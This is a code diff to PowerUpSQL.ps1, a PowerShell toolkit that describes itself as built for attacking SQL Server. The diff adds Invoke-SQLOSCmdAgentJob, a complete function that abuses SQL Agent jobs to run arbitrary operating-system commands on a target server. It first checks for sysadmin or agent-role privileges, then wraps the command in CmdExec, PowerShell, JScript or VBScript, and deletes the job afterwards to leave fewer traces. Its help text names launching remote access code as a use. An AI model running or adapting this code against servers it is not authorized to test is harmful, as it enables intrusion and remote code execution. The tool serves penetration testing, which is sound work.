@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Major Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.82.98
+        Version: 1.83.98
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -2302,6 +2302,345 @@ Function  Invoke-SQLOSCmdCLR
 
         # Run scriptblock using multi-threading
         $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
+
+        return $TblResults
+    }
+}
+
+
+# ----------------------------------
+#  Invoke-SQLOSCmd
+# ----------------------------------
+# Author: Leo Loobeek
+# Updates By: Scott Sutherland
+# TODO: 
+# - Find better option for SQL Agent Service check
+# - Find better option for SQL Agent Service start
+# - Add raw script option for jscript/vbscript
+Function  Invoke-SQLOSCmdAgentJob
+{
+    <#
+            .SYNOPSIS
+            Run operating system commands on a Microsoft SQL server by
+            leveraging the SQL Agent Job service. There is not a method to retrieve the output,
+            but it's useful for launching remote access code or sending output through another means.
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Credential
+            SQL Server credential.
+            .PARAMETER Instance
+            SQL Server instance to connection to.
+            .PARAMETER DAC
+            Connect using Dedicated Admin Connection.
+            .PARAMETER TimeOut
+            Connection time out.
+            .PARAMETER Sleep
+            Command execution time in seconds.
+            .PARAMETER SuppressVerbose
+            Suppress verbose errors.  Used when function is wrapped.
+            .PARAMETER Type
+            The type of Job subsystem to launch. Choices are CmdExec (windows command) or PowerShell.
+            .PARAMETER Command
+            Based on type chosen above, this is the command launched when the job is executed. If nesting PowerShell
+            variables within the command, it will need to be escaped with ` (back tick).
+            .LINK
+            https://technet.microsoft.com/en-us/library/ms187100(v=sql.105).aspx
+            PowerShell/CMDEXEC SubSystem code taken from Nick Popovich (@pipefish_) from Optiv.
+            https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution
+            ActiveX VBScript/Jscript SubSystem code based on scripts on Microsoft documentation.
+            .EXAMPLE
+            Invoke-SQLOSCmdAgentJob -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Username sa -Password 'EvilLama!' -SubSystem CmdExec -Command "echo hello > c:\windows\temp\test1.txt"
+            Invoke-SQLOSCmdAgentJob -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Username sa -Password 'EvilLama!' -SubSystem PowerShell -Command 'write-output "hello world" | out-file c:\windows\temp\test2.txt' -Sleep 20
+            Invoke-SQLOSCmdAgentJob -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Username sa -Password 'EvilLama!' -SubSystem VBScript -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test3.txt' 
+            Invoke-SQLOSCmdAgentJob -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Username sa -Password 'EvilLama!' -SubSystem JScript   -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test4.txt' 
+            .EXAMPLE
+            Invoke-SQLOSCmdAgentJob -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Username sa -Password 'EvilLama!' -SubSystem JScript -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test5.txt'
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Connection Success.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : SubSystem: JScript
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Command: c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test.txt
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : You have EXECUTE privileges to create Agent Jobs (sp_add_job).
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Running the command
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Starting sleep for 5 seconds
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Removing job from server
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Command complete
+
+            ComputerName                                    Instance                                       Results                                       
+            ------------                                    --------                                       -------                                       
+            MSSQLSRV04                                      MSSQLSRV04\SQLSERVER2014                       The Job succesfully started and was removed.
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Windows credentials.')]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Connect using Dedicated Admin Connection.')]
+        [Switch]$DAC,
+
+        [Parameter(Mandatory = $true,
+        HelpMessage = 'Support subsystems include CmdExec, PowerShell, JScript, and VBScript.')]
+        [ValidateSet("CmdExec", "PowerShell","JScript","VBScript")]
+        [string] $SubSystem,
+
+        [Parameter(Mandatory = $true,
+        HelpMessage = 'OS command to be executed.')]
+        [String]$Command,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Connection timeout.')]
+        [string]$TimeOut,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Command run time before killing the agent job.')]
+        [int]$Sleep = 5,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+        # Setup data table for output
+        $TblCommands = New-Object -TypeName System.Data.DataTable
+        $TblResults = New-Object -TypeName System.Data.DataTable
+        $null = $TblResults.Columns.Add('ComputerName')
+        $null = $TblResults.Columns.Add('Instance')
+        $null = $TblResults.Columns.Add('Results')
+
+    }
+
+    Process
+    {
+        # Default connection to local default instance
+        if(-not $Instance)
+        {
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Setup DAC string
+        if($DAC)
+        {
+            # Create connection object
+            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
+        }
+        else
+        {
+            # Create connection object
+            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
+        }
+        # Attempt connection
+        try
+        {
+            # Open connection
+            $Connection.Open()
+            if(-not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Success."
+
+                # Status configuration
+                Write-Verbose -Message "$Instance : SubSystem: $SubSystem"
+                Write-Verbose -Message "$Instance : Command: $Command"
+            }
+
+            # Get some information about current context
+            $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+            $CurrentLogin = $ServerInfo.CurrentLogin
+            $ComputerName = $ServerInfo.ComputerName
+            $SysadminStatus = $ServerInfo.IsSysAdmin
+
+            <# table not accessible to non sysadmin logins that may have other privileges
+            # Check if Agent Job service is running 
+            $IsAgentServiceEnabled = Get-SQLQuery -Instance $Instance -Query "SELECT 1 FROM sysprocesses WHERE LEFT(program_name, 8) = 'SQLAgent'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+
+            # See if the SQL Server Agent Service is enabled
+            
+            if ($IsAgentServiceEnabled)
+            {
+                Write-Verbose -Message "$Instance : Verfied the SQL Server Agent service is running."
+            }
+            else
+            {
+                # TODO: Find reliable way to start agent service if possible
+                Write-Verbose -Message "$Instance : SQL Server Agent service has not been started. Aborting..."
+                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'SQL Server Agent service not started.')
+                return
+            }
+            #>
+
+            # https://msdn.microsoft.com/en-us/library/ms188283.aspx
+            # Check to see if member of any SQL Agent roles listed above
+            # If a user is a sysadmin, or a member of any of the 3 database roles they should be able to
+            # create and execute their own agent jobs on the SQL server.
+
+            # Check for sysadmin role
+            if($SysadminStatus -eq "Yes"){
+                $ConfirmedPrivs = $CurrentLogin
+            }
+
+            # Check for agent database roles
+            $AddJobPrivs = Get-SQLDatabaseRoleMember -Username $Username -Password $Password -Instance $Instance -DatabaseName msdb -SuppressVerbose |             
+            ForEach-Object {                                 
+                if(($_.RolePrincipalName -match "SQLAgentUserRole|SQLAgentReaderRole|SQLAgentOperatorRole")) {
+                    if ($_.PrincipalName -eq $CurrentLogin) { 
+                        $ConfirmedPrivs = $CurrentLogin 
+                    }
+                }
+            }
+
+            # Attempt to create the agent jobs
+            if($ConfirmedPrivs)
+            {
+                Write-Verbose -Message "$Instance : You have EXECUTE privileges to create Agent Jobs (sp_add_job)."
+
+                # Setup place holder for $DatabaseSub
+                $DatabaseSub = ""
+                $SubSystemFinal = $SubSystem
+
+                # Setup JScript wrapper
+                If($SubSystem -eq "JScript"){
+
+                    # Double the slashes to support the command syntax
+                    $Command = $Command.Replace("\","\\")
+                
+
+                    # Create the JScript
+                    # Example command: c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\blah.txt
+                    $JScript_Command = @"
+function RunCmd()
+{
+    var WshShell = new ActiveXObject("WScript.Shell");  
+    var oExec = WshShell.Exec("$Command"); 
+    oExec = null; 
+    WshShell = null; 
+}
+
+RunCmd(); 
+"@
+                    # Overwrite command with the JScript
+                    $Command = $JScript_Command
+                    $SubSystemFinal = "ActiveScripting"
+                    $DatabaseSub = "@database_name=N'JavaScript',"	
+                }
+
+
+                # Setup VBScript wrapper
+                If($SubSystem -eq "VBScript"){
+
+                    # Create the VBScript
+                    # Example Command: c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\blah.txt
+                    $VBScript_Command = @"
+Function Main()
+    dim shell
+    set shell= CreateObject ("WScript.Shell")
+    shell.run("$Command")
+    set shell = nothing
+END Function
+"@
+                    # Overwrite command with the VBScript
+                    $Command = $VBScript_Command
+                    $SubSystemFinal = "ActiveScripting"
+                    $DatabaseSub = "@database_name=N'VBScript',"	
+                }                
+
+                # Fix single quotes so then can be used within commands ' -> ''
+                $Command = $Command -replace "'","''"
+
+                # Got the privs, let's execute some malicious code!
+                # SQL Query taken from https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution
+                # Authors: 
+                # Nicholas Popovich for PowerShelland CmdExec
+                # Scott Sutherland for VBScript and JScript
+                $JobQuery = "USE msdb; 
+                EXECUTE dbo.sp_add_job 
+                @job_name           = N'powerupsql_job'
+                
+                EXECUTE sp_add_jobstep 
+                @job_name           = N'powerupsql_job',
+                @step_name         = N'powerupsql_job_step', 
+                @subsystem         = N'$SubSystemFinal', 
+                @command           = N'$Command',
+                $DatabaseSub 
+                @flags=0,
+                @retry_attempts    = 1, 
+                @retry_interval    = 5     
+                           
+
+                EXECUTE dbo.sp_add_jobserver 
+                @job_name           = N'powerupsql_job'
+                
+                EXECUTE dbo.sp_start_job N'powerupsql_job'"
+
+                $CleanUpQuery = "USE msdb; EXECUTE sp_delete_job @job_name = N'powerupsql_job';"
+
+                Write-Verbose -Message "$Instance : Running the command"
+
+                # Execute Query
+                Get-SQLQuery -Instance $Instance -Query $JobQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+                
+                $result = Get-SQLQuery -Instance $Instance -Query "use msdb; EXECUTE sp_help_job @job_name = N'powerupsql_job'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+                
+                if(!($result)) {
+                    Write-Warning "Job failed to start. Recheck your command and try again."
+                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Agent Job failed to start.')
+                    return
+                }
+
+                # Sleep for 5 seconds to ensure job starts, may need to increase or remove this after further testing
+                Write-Verbose "$Instance : Starting sleep for $Sleep seconds"
+                Start-Sleep $Sleep
+
+                # Clean up the Job
+                Write-Verbose "$Instance : Removing job from server"
+                Get-SQLQuery -Instance $Instance -Query $CleanUpQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'The Job succesfully started and was removed.')
+
+            }
+            else
+            {
+                Write-Verbose -Message "$Instance : You do not have privileges to add agent jobs (sp_add_job). Aborting..."
+                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Insufficient privilieges to add Agent Jobs.')
+                return
+            }
+
+            # Close connection
+            $Connection.Close()
+
+            # Dispose connection
+            $Connection.Dispose()
+
+            # Status
+            Write-Verbose -Message "$Instance : Command complete"
+        }
+        catch
+        {
+            # Connection failed
+            if(-not $SuppressVerbose)
+            {
+                $ErrorMessage = $_.Exception.Message
+                Write-Verbose -Message "$Instance : Connection Failed."
+                #Write-Verbose  " Error: $ErrorMessage"
+            }
+            $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
+        }
 
         return $TblResults
     }
